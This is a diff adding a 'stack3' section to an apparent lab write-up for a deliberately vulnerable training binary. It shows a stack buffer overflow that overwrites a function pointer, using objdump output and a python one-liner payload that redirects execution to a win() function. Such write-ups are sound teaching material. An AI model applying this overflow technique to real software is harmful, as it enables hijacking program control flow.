@@ -202,3 +202,49 @@ $ echo $GREENIE
 $ ./stack2
 you have correctly modified the variable
 ```
+
+
+## stack3
+
+- The goal is to overwrite `fp` pointer to point to `win` function.
+- I will do that by overflowing the buffer that is 64 bytes long.
+- First I need to know what the address of `win` function is.
+- As you can see, I've overwrote the `fp` pointer with `ABCD`:
+
+```sh
+$ ./stack3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
+calling function pointer, jumping to 0x44434241
+Segmentation fault
+```
+
+- It tries to jump to `ABCD` but because it doesn't exist, it crashes with SEGFAULT.
+- Running a simple `objdump` and I can see address of `win` function:
+
+```sh
+$ objdump -Mintel -d stack3
+
+stack3:     file format elf32-i386
+
+-- snip -- 
+08048424 <win>:
+ 8048424:       55                      push   ebp
+ 8048425:       89 e5                   mov    ebp,esp
+ 8048427:       83 ec 18                sub    esp,0x18
+ 804842a:       c7 04 24 40 85 04 08    mov    DWORD PTR [esp],0x8048540
+ 8048431:       e8 2a ff ff ff          call   8048360 <puts@plt>
+ 8048436:       c9                      leave
+ 8048437:       c3                      ret
+```
+
+- Let's overflow `fp` with `\x24\x84\x04\x08`.
+- This is how I've done it:
+
+```sh
+$ python -c 'print("\x41" * 64 + "\x24\x84\x04\x08")' | ./stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+```
+
+- Because `buffer` is 64 bytes long, each subsequent character will spill into next variable in the stack.
+- That variable happens to be `fp`, which I need to change to point to `win` function.
